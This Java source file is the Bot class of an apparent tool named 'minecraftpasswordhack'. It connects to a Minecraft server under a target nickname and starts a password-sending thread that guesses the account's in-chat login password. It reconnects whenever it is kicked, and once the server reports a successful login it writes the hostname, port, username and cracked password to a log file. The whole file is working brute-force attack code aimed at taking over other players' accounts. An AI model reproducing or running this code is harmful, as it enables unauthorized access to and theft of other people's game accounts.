package xyz.minecraftpasswordhack.objects;

import java.net.Proxy;

import org.spacehq.mc.auth.data.GameProfile;
import org.spacehq.mc.protocol.MinecraftConstants;
import org.spacehq.mc.protocol.MinecraftProtocol;
import org.spacehq.mc.protocol.packet.ingame.client.ClientChatPacket;
import org.spacehq.mc.protocol.packet.ingame.server.ServerChatPacket;
import org.spacehq.mc.protocol.packet.ingame.server.ServerJoinGamePacket;
import org.spacehq.packetlib.Client;
import org.spacehq.packetlib.event.session.DisconnectedEvent;
import org.spacehq.packetlib.event.session.PacketReceivedEvent;
import org.spacehq.packetlib.event.session.PacketSentEvent;
import org.spacehq.packetlib.event.session.SessionAdapter;
import org.spacehq.packetlib.tcp.TcpSessionFactory;

import xyz.minecraftpasswordhack.Main;
import xyz.minecraftpasswordhack.threads.PasswordSending;
import xyz.minecraftpasswordhack.utils.PasswordUtil;

public class Bot {

	private String ip;
	private int port;
	private String nick;
	private Proxy proxy;
	private boolean stopped;
	
	public Bot(String ip, int port, String nick) {
		this.ip = ip;
		this.port = port;
		this.nick = nick;
		this.proxy = Proxy.NO_PROXY;
		this.stopped = false;
	}
	
	public void connect() {
		Client c = new Client(this.ip, this.port, new MinecraftProtocol(this.nick), new TcpSessionFactory(this.proxy));
		
		c.getSession().addListener(new SessionAdapter() {
			@Override
			public void packetReceived(PacketReceivedEvent event) {
				if (event.getPacket() instanceof ServerJoinGamePacket) {
					Main.getLogger().info("Polaczono pomyslnie. Rozpoczynam prace...");
					new Thread(new PasswordSending(event.getSession())).start();
				} else if (event.getPacket() instanceof ServerChatPacket) {
					ServerChatPacket p = event.getPacket();
					String message = p.getMessage().getFullText();
					if (message.contains(Main.getConfig().getLoginSucessMessage())) {
						setStopped(true);
						c.getSession().disconnect("finished!");
					}
				}
			}

			@Override
			public void packetSent(PacketSentEvent event) {
				if (event.getPacket() instanceof ClientChatPacket) {
					GameProfile p = event.getSession().getFlag(MinecraftConstants.PROFILE_KEY);
					ClientChatPacket pack = event.getPacket();
					
					System.out.println(p.getName() + " >> " + pack.getMessage());
				}
			}

			@Override
			public void disconnected(DisconnectedEvent event) {
				if (!isStopped()) {
					Main.getLogger().info("Ponowne laczenie z powodu wyrzucenia (Powod: " + event.getReason() + ")");
					connect();
				} else {
					String newLine = System.lineSeparator();
					String str = "###################################" + newLine 
							+ "hostname=" + ip + newLine 
							+ "port=" + port + newLine
							+ "username=" + nick + newLine
							+ "password=" + PasswordUtil.getCurrentPassword() + newLine
							+ "###################################" + newLine + newLine;
					Main.getConfig().writeToLogs(str);
					Main.getLogger().info("Praca zakonczona. Zajrzyj do logs.txt!");
					System.exit(0);
				}
			}
		});
		
		c.getSession().connect();
	}

	public String getIp() {
		return ip;
	}

	public void setIp(String ip) {
		this.ip = ip;
	}

	public int getPort() {
		return port;
	}

	public void setPort(int port) {
		this.port = port;
	}

	public String getNick() {
		return nick;
	}

	public void setNick(String nick) {
		this.nick = nick;
	}

	public Proxy getProxy() {
		return proxy;
	}

	public void setProxy(Proxy proxy) {
		this.proxy = proxy;
	}

	public boolean isStopped() {
		return stopped;
	}

	public void setStopped(boolean stopped) {
		this.stopped = stopped;
	}
}